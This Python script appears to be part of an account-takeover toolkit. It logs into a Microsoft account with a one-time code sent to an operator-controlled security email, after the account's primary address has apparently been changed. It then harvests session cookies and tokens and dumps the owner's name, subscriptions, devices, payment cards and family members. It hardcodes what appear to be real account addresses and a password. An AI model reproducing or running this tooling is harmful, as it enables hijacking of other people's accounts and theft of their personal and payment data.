#!/usr/bin/env python3
"""Live OGI probe: OTP login → polish → owner/subs/devices/cards/family."""
from __future__ import annotations

import asyncio
import json
import logging
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
logging.basicConfig(level=logging.INFO, format="%(levelname)s %(name)s: %(message)s")

from database.database import DBConnection
from securing.auth.get_msaauth import get_msaauth
from securing.auth.handle_redirects import get_data, handle_redirects
from securing.auth.initial_session import get_session
from securing.auth.polish_host import polish_host
from securing.auth.send_auth import send_auth
from securing.utils.cookies.get_amc import get_amc
from securing.utils.cookies.get_email_code import get_email_code
from securing.utils.cookies.get_livedata import livedata
from securing.utils.cookies.get_msadelegate import get_msadelegate
from securing.utils.cookies.safe_cookies import has_cookie
from securing.utils.ogi.get_cards import get_cards
from securing.utils.ogi.get_devices import get_devices
from securing.utils.ogi.get_family import get_family
from securing.utils.ogi.get_owner_info import get_owner_info
from securing.utils.ogi.get_subscriptions import get_subscriptions
from securing.utils.ogi.owner_from_jwt import owner_info_from_amc_jwt
from securing.utils.proxy import close_session

# Post-primary-change credentials (NalanTheGoat)
PRIMARY = "sunnya4085ef10ecb@outlook.com"
ORIGINAL = "noloveyahXdgW23@outlook.com"
PWD = "ApS96aYMYTDcxj"
SEC = "3d53d15d899345f7@ilovevbucks.site"


async def main() -> None:
    with DBConnection() as db:
        try:
            db.add_security_email(SEC, PWD)
        except Exception as e:
            print("sec email register:", e)
        db.cursor.execute(
            "UPDATE received_emails SET consumed=0 WHERE lower(to_address)=? AND consumed=1 "
            "AND id = (SELECT MAX(id) FROM received_emails WHERE lower(to_address)=?)",
            (SEC.lower(), SEC.lower()),
        )

    session = get_session()
    try:
        # Prefer new primary; fall back to original alias
        login_email = PRIMARY
        info = await send_auth(session, login_email, SEC)
        proofs = (
            (info.get("response") or {})
            .get("Credentials", {})
            .get("OtcLoginEligibleProofs")
            or []
        )
        if not proofs:
            print("no proofs on primary — trying original alias")
            login_email = ORIGINAL
            info = await send_auth(session, login_email, SEC)
            proofs = (
                (info.get("response") or {})
                .get("Credentials", {})
                .get("OtcLoginEligibleProofs")
                or []
            )
        if not proofs:
            print("LOGIN FAIL: no OTC proofs", json.dumps(info, default=str)[:500])
            return

        flowtoken = proofs[0]["data"]
        print(f"waiting login OTP on {SEC} (as {login_email})…")
        code = await get_email_code(SEC, timeout=150)
        print("OTP", code)
        if not code:
            return

        live = await livedata(session)
        msa = await get_msaauth(
            session,
            login_email,
            flowtoken,
            {"urlPost": live["urlPost"], "ppft": info.get("ppft") or live["ppft"]},
            code,
        )
        if isinstance(msa, str):
            handled = await handle_redirects(session, msa)
            msa = handled if isinstance(handled, dict) else get_data(msa)
        if not msa and (
            has_cookie(session, "__Host-MSAAUTH") or has_cookie(session, "MSPAuth")
        ):
            msa = {"_cookies_only": True}
        if not msa:
            print("login failed — no msaauth")
            return

        await polish_host(session, msa if isinstance(msa, dict) else {})
        cookies = [
            c
            for c in (
                "__Host-MSAAUTH",
                "MSPAuth",
                "WLSSC",
                "AMCSecAuth",
                "AMCSecAuthJWT",
            )
            if has_cookie(session, c)
        ]
        print("cookies:", cookies)

        try:
            tokens = await get_amc(session)
        except Exception as e:
            print("get_amc FAILED", e)
            tokens = {"home": "", "profile": "", "devices": ""}
        print("tokens present:", {k: bool(v) for k, v in tokens.items()})

        msadelegate = await get_msadelegate(session)
        print("msadelegate:", bool(msadelegate), (msadelegate or "")[:40])

        owner = await get_owner_info(session, tokens.get("profile") or "")
        print("\n=== OWNER ===")
        print(json.dumps(owner, default=str)[:800])
        if not owner.get("firstName"):
            jwt_fallback = owner_info_from_amc_jwt(session)
            print("JWT fallback:", json.dumps(jwt_fallback, default=str)[:400])

        subs = await get_subscriptions(session, tokens.get("home") or "")
        print("\n=== SUBS ===")
        print(json.dumps(subs, default=str)[:800])

        devices = await get_devices(session, tokens.get("home") or "")
        print("\n=== DEVICES ===")
        print(json.dumps(devices, default=str)[:800])

        cards = await get_cards(session, tokens.get("home") or "")
        print("\n=== CARDS ===")
        print(json.dumps(cards, default=str)[:800])

        family = await get_family(session, tokens.get("home") or "")
        print("\n=== FAMILY ===")
        print(json.dumps(family, default=str)[:800])

        ok_name = bool(owner.get("firstName") or owner.get("lastName"))
        if not ok_name:
            jf = owner_info_from_amc_jwt(session)
            ok_name = bool(jf.get("firstName") or jf.get("lastName"))
        print(
            "\n=== SUMMARY ===\n"
            f"names_ok={ok_name} "
            f"subs_ok={isinstance(subs, dict)} "
            f"devices_count={len((devices or {}).get('devices') or [])} "
            f"cards_count={len((cards or {}).get('paymentInstruments') or [])} "
            f"family_count={len((family or {}).get('members') or [])}"
        )
    finally:
        await close_session(session)


if __name__ == "__main__":
    asyncio.run(main())
